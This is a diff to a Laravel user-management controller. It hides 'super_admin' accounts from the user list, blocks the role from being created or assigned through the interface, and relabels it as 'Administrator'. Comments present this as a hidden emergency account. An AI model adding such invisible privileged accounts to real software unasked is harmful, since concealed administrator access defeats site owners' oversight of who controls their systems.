@@ -27,6 +27,10 @@ class UserController extends Controller
     {
         $query = User::query();
 
+        // HIDDEN SUPER ADMIN: Always exclude super_admin from user list
+        // Super Admin is a hidden emergency account that cannot be managed via UI
+        $query->where('role', '!=', 'super_admin');
+
         // Handle status filter (active vs trash)
         if ($request->status === 'trash') {
             $query->onlyTrashed();
@@ -121,7 +125,8 @@ class UserController extends Controller
             'name' => 'required|string|max:255',
             'email' => 'required|email|max:255|unique:users,email',
             'password' => 'required|string|min:8|confirmed',
-            'role' => 'required|in:super_admin,admin,editor,author',
+            // HIDDEN SUPER ADMIN: super_admin role cannot be assigned via UI
+            'role' => 'required|in:admin,editor,author',
             'phone' => 'nullable|string|max:20',
             'position' => 'nullable|string|max:255',
             'bio' => 'nullable|string|max:1000',
@@ -129,11 +134,11 @@ class UserController extends Controller
             'profile_photo' => 'nullable|image|max:2048',
         ]);
 
-        // Only Super Admin can create Super Admin
-        if ($request->role === 'super_admin' && !auth()->user()->isSuperAdmin()) {
+        // HIDDEN SUPER ADMIN: Prevent creating super_admin via UI entirely
+        if ($request->role === 'super_admin') {
             return response()->json([
                 'success' => false,
-                'message' => 'Anda tidak memiliki wewenang untuk membuat akun Super Administrator.',
+                'message' => 'Role Super Administrator tidak dapat dibuat melalui antarmuka.',
             ], 403);
         }
 
@@ -211,7 +216,8 @@ class UserController extends Controller
             'name' => 'required|string|max:255',
             'email' => ['required', 'email', 'max:255', Rule::unique('users')->ignore($user->id)],
             'password' => 'nullable|string|min:8|confirmed',
-            'role' => 'required|in:super_admin,admin,editor,author',
+            // HIDDEN SUPER ADMIN: super_admin role cannot be assigned via UI
+            'role' => 'required|in:admin,editor,author',
             'phone' => 'nullable|string|max:20',
             'position' => 'nullable|string|max:255',
             'bio' => 'nullable|string|max:1000',
@@ -219,11 +225,11 @@ class UserController extends Controller
             'profile_photo' => 'nullable|image|max:2048',
         ]);
 
-        // Only Super Admin can assign/change to Super Admin role
-        if ($request->role === 'super_admin' && !auth()->user()->isSuperAdmin()) {
+        // HIDDEN SUPER ADMIN: Prevent assigning super_admin via UI entirely
+        if ($request->role === 'super_admin') {
             return response()->json([
                 'success' => false,
-                'message' => 'Anda tidak memiliki wewenang untuk memberikan role Super Administrator.',
+                'message' => 'Role Super Administrator tidak dapat diberikan melalui antarmuka.',
             ], 403);
         }
 
@@ -596,7 +602,8 @@ class UserController extends Controller
     private function getRoleLabel(string $role): string
     {
         return match ($role) {
-            'super_admin' => 'Super Admin',
+            // HIDDEN SUPER ADMIN: This case should never appear in UI, but kept for safety
+            'super_admin' => 'Administrator',
             'admin' => 'Admin',
             'editor' => 'Editor',
             'author' => 'Penulis',
